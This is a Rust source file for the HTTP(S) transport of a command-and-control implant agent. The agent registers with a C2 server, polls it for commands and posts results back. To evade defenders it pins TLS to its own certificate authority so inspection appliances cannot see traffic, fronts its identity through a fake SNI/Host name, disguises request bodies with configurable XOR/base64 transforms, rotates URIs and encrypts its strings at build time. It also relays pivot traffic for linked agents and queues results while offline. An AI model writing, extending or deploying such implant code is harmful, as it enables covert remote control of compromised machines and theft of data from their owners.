// src/agent/http_transport.rs
//
// Agent-side HTTP(S) transport. Instead of maintaining a persistent TCP
// connection, the agent polls the C2 server via standard HTTP requests.
// This allows traffic to traverse corporate proxies, WAFs, and SSL
// inspection appliances.
//
// Flow:
//   1. POST /register with ClientHello -> receive session token
//   2. Loop:
//      a. GET /<poll_uri> with token in X-Request-ID header -> receive commands
//      b. Process commands
//      c. POST /<result_uri> with results in body
//      d. Sleep
//
// Increased request timeout from 30 s -> 120 s so that
// large file-transfer operations do not trigger premature reconnects
// when the blocking I/O pool is under heavy load.

use crate::strcrypt_rt;
use strcrypt::aes_str;
use reqwest::{Client, Proxy};
use serde::Deserialize;

use crate::common::{C2Config, ClientHello, SecuredCommand, CommandResponse, MalleableProfile, HttpBlock, TransformStep, PivotFrame};
use base64::{Engine as _, engine::general_purpose::STANDARD as B64};

/// Build an HTTP client with proxy, TLS pinning, and settings from the config.
pub fn build_client(config: &C2Config) -> Result<Client, String> {
    // Timeouts from the typed agent config (defaults: 120 s request,
    // 15 s connect). The 120 s request timeout keeps large file-transfer
    // operations from triggering premature reconnects when the blocking
    // I/O pool is under heavy load.
    // (Fully-qualified: the `config: &C2Config` parameter shadows the accessor.)
    let agent_cfg = &crate::config::config().agent;
    let mut builder = Client::builder()
        .timeout(std::time::Duration::from_secs(agent_cfg.request_timeout_secs))
        .connect_timeout(std::time::Duration::from_secs(agent_cfg.connect_timeout_secs));

    let sni = config.sni_override.as_deref().filter(|s| !s.is_empty());
    let https = config.transport == crate::common::TransportProtocol::Https;
    if https && (sni.is_some() || !config.alpn_protocols.is_empty()) {
        // sni_override / alpn_protocols require TLS knobs reqwest only
        // exposes through a preconfigured rustls ClientConfig, so the
        // pinned CA and client auth cert (same material the raw TLS path
        // uses) are loaded through pki and ALPN is set on top.
        let ca = include_bytes!("../../certs/ca.crt");
        let client_cert = include_bytes!("../../certs/client.crt");
        let client_key = include_bytes!("../../certs/client.key.der");
        let mut tls = crate::pki::create_client_config(ca, client_cert, client_key)
            .map_err(|e| format!("{} {}", aes_str!("TLS config:"), e))?;
        if !config.alpn_protocols.is_empty() {
            tls.alpn_protocols = config.alpn_protocols
                .iter()
                .map(|p| p.as_bytes().to_vec())
                .collect();
        }
        builder = builder.use_preconfigured_tls(tls);

        if let Some(name) = sni {
            // reqwest derives the rustls ServerName from the request URL,
            // so the override name goes into base_url() (SNI + Host header)
            // and the connection is pinned back to the real C2 address
            // here. One blocking DNS lookup at client build time;
            // build_client only runs on the registration path, never on
            // the hot poll loop.
            use std::net::ToSocketAddrs;
            let addr = format!("{}:{}", config.c2_host, config.tunnel_port)
                .to_socket_addrs()
                .map_err(|e| format!("{} {}: {}", aes_str!("SNI override: cannot resolve C2 host"), config.c2_host, e))?
                .next()
                .ok_or_else(|| format!("{} {}", aes_str!("SNI override: C2 host has no addresses:"), config.c2_host))?;
            builder = builder.resolve(name, addr);
        }
    } else {
        // Pin to the build-time CA certificate instead of accepting any
        // cert. This prevents SSL-inspecting firewalls and MITM attackers
        // from intercepting C2 traffic, even with self-signed
        // infrastructure.
        let ca_pem = include_bytes!("../../certs/ca.crt");
        let ca_cert = reqwest::Certificate::from_pem(ca_pem)
            .map_err(|e| format!("{} {}", aes_str!("Failed to parse embedded CA cert:"), e))?;
        builder = builder
            .add_root_certificate(ca_cert)
            .tls_built_in_root_certs(false); // Only trust our pinned CA, not the system store
    }

    // User-Agent from malleable profile
    if !config.profile.user_agent.is_empty() {
        builder = builder.user_agent(&config.profile.user_agent);
    }

    // Proxy configuration
    let proxy = &config.proxy;
    if !proxy.url.is_empty() {
        // Explicit proxy
        let mut p = Proxy::all(&proxy.url).map_err(|e| format!("{} {}", aes_str!("Proxy URL:"), e))?;
        if !proxy.username.is_empty() {
            p = p.basic_auth(&proxy.username, &proxy.password);
        }
        builder = builder.proxy(p);
    } else if !proxy.use_system {
        // Explicitly no proxy
        builder = builder.no_proxy();
    }
    // If use_system is true and url is empty, reqwest uses system proxy by default

    builder.build().map_err(|e| format!("{} {}", aes_str!("HTTP client:"), e))
}

/// The base URL for the C2 server. In HTTPS mode with sni_override set,
/// the URL host carries the override name so the TLS SNI and the HTTP Host
/// header present the fronting identity; the TCP connection itself is
/// pinned to the real C2 address by the resolve() entry in build_client.
pub fn base_url(config: &C2Config) -> String {
    let scheme = if config.transport == crate::common::TransportProtocol::Https {
        aes_str!("https")
    } else {
        aes_str!("http")
    };
    let host = if config.transport == crate::common::TransportProtocol::Https {
        config.sni_override.as_deref().filter(|s| !s.is_empty()).unwrap_or(&config.c2_host)
    } else {
        &config.c2_host
    };
    format!("{}://{}:{}", scheme, host, config.tunnel_port)
}

/// Register with the C2 server. Returns the session token.
pub async fn register(client: &Client, base: &str, hello: &ClientHello) -> Result<(String, Vec<SecuredCommand>), String> {
    let url = format!("{}{}", base, aes_str!("/register"));
    let resp = client.post(&url)
        .json(hello)
        .send()
        .await
        .map_err(|e| format!("{} {}", aes_str!("Register:"), e))?;

    if !resp.status().is_success() {
        return Err(format!("{} {}", aes_str!("Register failed: HTTP"), resp.status()));
    }

    // Mirrors the server-side registration response in
    // src/server/http_listener.rs. Manual seq impl (positional
    // [token, commands]) so no field names leak into the agent binary.
    struct RegisterResponse {
        token: String,
        commands: Vec<SecuredCommand>,
    }

    impl<'de> Deserialize<'de> for RegisterResponse {
        fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
            struct V;
            impl<'de> serde::de::Visitor<'de> for V {
                type Value = RegisterResponse;
                fn expecting(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result { f.write_str(aes_str!("seq").as_str()) }
                fn visit_seq<A: serde::de::SeqAccess<'de>>(self, mut s: A) -> Result<Self::Value, A::Error> {
                    Ok(RegisterResponse {
                        token: s.next_element()?.ok_or_else(|| serde::de::Error::custom(aes_str!("truncated")))?,
                        commands: s.next_element()?.unwrap_or_default(),
                    })
                }
            }
            deserializer.deserialize_seq(V)
        }
    }

    let data: RegisterResponse = resp.json().await.map_err(|e| format!("{} {}", aes_str!("Parse:"), e))?;
    Ok((data.token, data.commands))
}

/// Failure classification for poll/result requests. The server answers
/// unknown or expired session tokens with a 200 decoy page (never 4xx), so
/// "is this response actually C2 JSON" is the real session-validity signal.
#[derive(Debug)]
pub enum HttpFailure {
    /// Transport-level failure (DNS/TCP/TLS/timeout, 5xx): the session may
    /// still be valid; the caller counts these and fails over after a budget.
    Transport(String),
    /// The server does not recognize the session (decoy/non-JSON body or
    /// 4xx): re-register instead of polling a decoy page forever.
    SessionInvalid(String),
}

impl std::fmt::Display for HttpFailure {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            HttpFailure::Transport(e) | HttpFailure::SessionInvalid(e) => write!(f, "{}", e),
        }
    }
}

/// Classify an unexpected HTTP status for poll/result requests.
fn status_failure(prefix: &str, status: reqwest::StatusCode) -> HttpFailure {
    if status.is_client_error() {
        HttpFailure::SessionInvalid(format!("{} {}", prefix, status))
    } else {
        HttpFailure::Transport(format!("{} {}", prefix, status))
    }
}

// ── Profile application, URI rotation, pivot routing ─────────────────────────
// The transform helpers mirror crate::traffic::DataMolder step-for-step so
// HTTP(S) polling presents the same on-wire shape as the raw TCP/TLS path.
// DataMolder is private to src/traffic.rs; the duplication is intentional
// until the traffic.rs owner consolidates the two.

/// Outbound body transform, mirroring DataMolder::apply_transform.
pub fn apply_body_transform(data: &[u8], steps: &[TransformStep]) -> Vec<u8> {
    let mut buffer = data.to_vec();
    for step in steps {
        match step {
            TransformStep::Base64 => {
                buffer = B64.encode(&buffer).into_bytes();
            },
            TransformStep::Hex => {
                buffer = hex::encode(&buffer).into_bytes();
            },
            TransformStep::Mask(key) => {
                if !key.is_empty() {
                    for (i, byte) in buffer.iter_mut().enumerate() {
                        *byte ^= key[i % key.len()];
                    }
                }
            },
            TransformStep::Prepend(s) => {
                let mut new_buf = s.as_bytes().to_vec();
                new_buf.extend_from_slice(&buffer);
                buffer = new_buf;
            },
            TransformStep::Append(s) => {
                buffer.extend_from_slice(s.as_bytes());
            }
        }
    }
    buffer
}

/// Inbound body transform, mirroring DataMolder::reverse_transform.
pub fn reverse_body_transform(data: &[u8], steps: &[TransformStep]) -> Result<Vec<u8>, String> {
    let mut buffer = data.to_vec();
    for step in steps.iter().rev() {
        match step {
            TransformStep::Base64 => {
                let clean: Vec<u8> = buffer.into_iter().filter(|b| !b.is_ascii_whitespace()).collect();
                buffer = B64.decode(&clean).map_err(|e| format!("{} {}", aes_str!("base64:"), e))?;
            },
            TransformStep::Hex => {
                buffer = hex::decode(&buffer).map_err(|e| format!("{} {}", aes_str!("hex:"), e))?;
            },
            TransformStep::Mask(key) => {
                if !key.is_empty() {
                    for (i, byte) in buffer.iter_mut().enumerate() {
                        *byte ^= key[i % key.len()];
                    }
                }
            },
            TransformStep::Prepend(s) => {
                let p = s.as_bytes();
                if buffer.starts_with(p) {
                    buffer = buffer[p.len()..].to_vec();
                } else {
                    return Err(aes_str!("Prepend Mismatch"));
                }
            },
            TransformStep::Append(s) => {
                let a = s.as_bytes();
                if buffer.ends_with(a) {
                    buffer.truncate(buffer.len() - a.len());
                } else {
                    return Err(aes_str!("Append Mismatch"));
                }
            }
        }
    }
    Ok(buffer)
}

/// Apply a profile block's request headers.
fn apply_block_headers(req: reqwest::RequestBuilder, block: &HttpBlock) -> reqwest::RequestBuilder {
    let mut r = req;
    for (k, v) in &block.headers {
        r = r.header(k.as_str(), v.as_str());
    }
    r
}

/// Round-robin rotation over the profile's URI sets with failure-aware
/// stickinessan index only advances after a successful request,
/// because poll failures are connection-level (server unreachable), not
/// URI-level. Healthy sessions spread requests across the whole URI set.
#[derive(Default)]
pub struct UriRotator {
    get: usize,
    post: usize,
}

impl UriRotator {
    pub fn new() -> Self { Self::default() }

    fn pick(uris: &[String], idx: usize) -> String {
        if uris.is_empty() {
            return aes_str!("/api/v1/sync");
        }
        uris[idx % uris.len()].clone()
    }

    /// URI for the next poll (GET block).
    pub fn poll_uri(&self, profile: &MalleableProfile) -> String {
        Self::pick(&profile.http_get.uris, self.get)
    }

    /// URI for the next result POST (POST block).
    pub fn result_uri(&self, profile: &MalleableProfile) -> String {
        Self::pick(&profile.http_post.uris, self.post)
    }

    /// Advance the GET rotation after a successful poll.
    pub fn note_poll_ok(&mut self, profile: &MalleableProfile) {
        if !profile.http_get.uris.is_empty() {
            self.get = (self.get + 1) % profile.http_get.uris.len();
        }
    }

    /// Advance the POST rotation after a successful delivery.
    pub fn note_result_ok(&mut self, profile: &MalleableProfile) {
        if !profile.http_post.uris.is_empty() {
            self.post = (self.post + 1) % profile.http_post.uris.len();
        }
    }
}

/// One poll cycle's worth of inbound data: queued commands plus any
/// downstream pivot frames the server mixed into the body.
#[derive(Debug)]
pub struct PollBatch {
    pub commands: Vec<SecuredCommand>,
    pub pivot_frames: Vec<PivotFrame>,
}

/// Split a poll body into commands and pivot frames. Both are serialized
/// as positional JSON seqs with incompatible shapes (a PivotFrame starts
/// with a number, a SecuredCommand with a string), so each element
/// classifies cleanly by trying PivotFrame first, mirroring the raw-stream
/// reader in the TCP/TLS loop.
pub fn split_inbound(body: &[u8]) -> Result<PollBatch, String> {
    let items: Vec<serde_json::Value> = serde_json::from_slice(body)
        .map_err(|e| format!("{} {}", aes_str!("Parse commands:"), e))?;
    let mut batch = PollBatch { commands: Vec::new(), pivot_frames: Vec::new() };
    for item in items {
        if let Ok(frame) = serde_json::from_value::<PivotFrame>(item.clone()) {
            batch.pivot_frames.push(frame);
            continue;
        }
        match serde_json::from_value::<SecuredCommand>(item) {
            Ok(cmd) => batch.commands.push(cmd),
            Err(_) => return Err(aes_str!("Unrecognized element in poll body")),
        }
    }
    Ok(batch)
}

/// What the agent owes the server: a command result, or a pivot frame
/// heading upstream from a downstream linked agent.
pub enum OutboundItem {
    Result(CommandResponse),
    Pivot(PivotFrame),
}

/// Classify one drained outbound payload. PivotFrame first, mirroring the
/// raw-stream writer path; anything else must be a CommandResponse.
pub fn classify_outbound(data: &[u8]) -> Option<OutboundItem> {
    if let Ok(frame) = serde_json::from_slice::<PivotFrame>(data) {
        return Some(OutboundItem::Pivot(frame));
    }
    serde_json::from_slice::<CommandResponse>(data).ok().map(OutboundItem::Result)
}

/// Shared result/ pivot POST path: serialize happened at the caller, the
/// POST-block transform is applied here, and a non-empty ack body means the
/// session is gone (decoy page), never a transport fault.
async fn post_transformed(
    client: &Client,
    base: &str,
    token: &str,
    uri: &str,
    block: &HttpBlock,
    body: Vec<u8>,
) -> Result<(), HttpFailure> {
    let url = format!("{}{}", base, uri);
    let content_type = if block.data_transform.is_empty() {
        aes_str!("application/json")
    } else {
        aes_str!("application/octet-stream")
    };
    let resp = apply_block_headers(
        client.post(&url)
            .header(aes_str!("X-Session-Token"), token)
            .header(reqwest::header::CONTENT_TYPE, content_type)
            .body(body),
        block,
    )
        .send()
        .await
        .map_err(|e| HttpFailure::Transport(format!("{} {}", aes_str!("Send:"), e)))?;

    if !resp.status().is_success() {
        return Err(status_failure("Send: HTTP", resp.status()));
    }

    let ack = resp.text().await.map_err(|e| HttpFailure::Transport(format!("{} {}", aes_str!("Body:"), e)))?;
    if !ack.trim().is_empty() {
        return Err(HttpFailure::SessionInvalid(aes_str!("Send: session rejected (non-empty ack body)")));
    }
    Ok(())
}

/// Poll with the full profile appliedGET-block headers on the
/// request, GET-block transform reversed off the response, URI from the
/// rotator. Downstream pivot frames ride home in the same body and
/// come back in the PollBatch.
pub async fn poll_profile(
    client: &Client,
    base: &str,
    token: &str,
    rotator: &mut UriRotator,
    profile: &MalleableProfile,
) -> Result<PollBatch, HttpFailure> {
    let url = format!("{}{}", base, rotator.poll_uri(profile));
    let block = &profile.http_get;
    let resp = apply_block_headers(
        client.get(&url).header(aes_str!("X-Session-Token"), token),
        block,
    )
        .send()
        .await
        .map_err(|e| HttpFailure::Transport(format!("{} {}", aes_str!("Poll:"), e)))?;

    if !resp.status().is_success() {
        return Err(status_failure("Poll: HTTP", resp.status()));
    }

    let body = resp.text().await.map_err(|e| HttpFailure::Transport(format!("{} {}", aes_str!("Body:"), e)))?;
    let empty = PollBatch { commands: Vec::new(), pivot_frames: Vec::new() };
    if body.trim().is_empty() {
        rotator.note_poll_ok(profile);
        return Ok(empty);
    }

    let decoded = if block.data_transform.is_empty() {
        body.into_bytes()
    } else {
        // A body that fails the reverse transform (e.g. the decoy HTML page
        // served for unknown tokens) means the session is gone.
        reverse_body_transform(body.as_bytes(), &block.data_transform)
            .map_err(|e| HttpFailure::SessionInvalid(format!("{} {}", aes_str!("Reverse transform:"), e)))?
    };

    if String::from_utf8_lossy(&decoded).contains(&aes_str!("\"data\":[]")) {
        rotator.note_poll_ok(profile);
        return Ok(empty);
    }

    let batch = split_inbound(&decoded).map_err(HttpFailure::SessionInvalid)?;
    rotator.note_poll_ok(profile);
    Ok(batch)
}

/// Send a command response with the POST block's headers and body
/// transform applied, URI from the rotator.
pub async fn send_result_profile(
    client: &Client,
    base: &str,
    token: &str,
    resp: &CommandResponse,
    rotator: &mut UriRotator,
    profile: &MalleableProfile,
) -> Result<(), HttpFailure> {
    let block = &profile.http_post;
    let json = serde_json::to_vec(resp)
        .map_err(|e| HttpFailure::Transport(format!("{} {}", aes_str!("Serialize:"), e)))?;
    let body = apply_body_transform(&json, &block.data_transform);
    post_transformed(client, base, token, &rotator.result_uri(profile), block, body).await?;
    rotator.note_result_ok(profile);
    Ok(())
}

/// POST a serialized pivot frame upstream. Pivot frames are live
/// socket data: they deliberately bypass the Outbox, because replaying a
/// stale frame after a reconnect would corrupt the linked stream.
pub async fn send_pivot_frame(
    client: &Client,
    base: &str,
    token: &str,
    frame: &PivotFrame,
    rotator: &mut UriRotator,
    profile: &MalleableProfile,
) -> Result<(), HttpFailure> {
    let block = &profile.http_post;
    let json = serde_json::to_vec(frame)
        .map_err(|e| HttpFailure::Transport(format!("{} {}", aes_str!("Serialize:"), e)))?;
    let body = apply_body_transform(&json, &block.data_transform);
    post_transformed(client, base, token, &rotator.result_uri(profile), block, body).await?;
    rotator.note_result_ok(profile);
    Ok(())
}

/// Poll for commands. Returns any queued commands.
/// Legacy profile-unaware call path, kept so the current HTTP loop in
/// mod.rs keeps compiling; superseded by poll_profile.
pub async fn poll(client: &Client, base: &str, token: &str, profile_uri: &str) -> Result<Vec<SecuredCommand>, HttpFailure> {
    let mut rot = UriRotator::new();
    let mut p = MalleableProfile::default();
    p.http_get.uris = vec![profile_uri.to_string()];
    let batch = poll_profile(client, base, token, &mut rot, &p).await?;
    Ok(batch.commands)
}

/// Send a command response back to the server.
/// Legacy profile-unaware call path; superseded by send_result_profile.
pub async fn send_result(client: &Client, base: &str, token: &str, resp: &CommandResponse, profile_uri: &str) -> Result<(), HttpFailure> {
    let mut rot = UriRotator::new();
    let mut p = MalleableProfile::default();
    p.http_post.uris = vec![profile_uri.to_string()];
    send_result_profile(client, base, token, resp, &mut rot, &p).await
}

/// Bounded offline queue for results that could not be delivered. Results
/// produced while the C2 is unreachable (or the session is being
/// re-registered) are kept and flushed once a session is up. Bounds:
/// 100 entries or 1 MiB, drop-oldest with a debug note; each entry is
/// dropped after OUTBOX_MAX_ATTEMPTS failed deliveries (debug note) so a
/// poison result cannot wedge the queue forever.
pub struct Outbox {
    entries: std::collections::VecDeque<(CommandResponse, u32)>,
    bytes: usize,
}

pub const OUTBOX_MAX_ENTRIES: usize = 100;
pub const OUTBOX_MAX_BYTES: usize = 1_048_576;
pub const OUTBOX_MAX_ATTEMPTS: u32 = 10;

fn entry_size(resp: &CommandResponse) -> usize {
    resp.output.len() + resp.error.len() + 64
}

impl Outbox {
    pub fn new() -> Self {
        Self { entries: std::collections::VecDeque::new(), bytes: 0 }
    }

    pub fn push(&mut self, resp: CommandResponse, debug: bool) {
        let size = entry_size(&resp);
        while self.entries.len() >= OUTBOX_MAX_ENTRIES || self.bytes + size > OUTBOX_MAX_BYTES {
            match self.entries.pop_front() {
                Some((old, _)) => {
                    self.bytes = self.bytes.saturating_sub(entry_size(&old));
                    if debug { eprintln!("{}", aes_str!("[-] Outbox full - dropped oldest queued result")); }
                }
                None => break,
            }
        }
        self.bytes += size;
        self.entries.push_back((resp, 0));
    }

    /// Next result awaiting delivery.
    pub fn front(&self) -> Option<&CommandResponse> {
        self.entries.front().map(|(r, _)| r)
    }

    /// Delivery succeeded: drop the front entry.
    pub fn pop(&mut self) {
        if let Some((old, _)) = self.entries.pop_front() {
            self.bytes = self.bytes.saturating_sub(entry_size(&old));
        }
    }

    /// Delivery failed: count the attempt against the front entry and drop
    /// it once the attempt budget is exhausted.
    pub fn note_send_failure(&mut self, debug: bool) {
        let exhausted = if let Some((_, attempts)) = self.entries.front_mut() {
            *attempts += 1;
            *attempts >= OUTBOX_MAX_ATTEMPTS
        } else {
            false
        };
        if exhausted {
            if debug { eprintln!("{}", aes_str!("[-] Outbox: result dropped after max send attempts")); }
            self.pop();
        }
    }

    pub fn len(&self) -> usize {
        self.entries.len()
    }
}